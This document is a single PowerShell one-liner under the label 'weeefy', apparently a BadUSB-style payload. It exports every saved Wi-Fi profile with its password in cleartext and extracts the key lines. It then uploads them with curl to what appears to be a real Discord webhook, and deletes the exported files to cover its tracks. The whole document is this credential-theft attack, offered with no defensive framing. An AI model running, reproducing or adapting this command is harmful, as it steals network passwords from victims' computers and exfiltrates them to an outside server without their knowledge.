weeefy:

cd $env:tmp;netsh wlan export profile key=clear;Select-String -Path Wi*.xml -Pattern 'keyMa*' > Wi-Fi;curl.exe -F "f=@Wi-Fi" "https://discord.com/api/webhooks/1291043643804614757/c1V5o7T1Ss0t1fMThP98fAZK9mFCrB9tK4gCWProZ3RgHdl1VHvBy_lGudQPI_eVWKsc";rm "Wi-*"

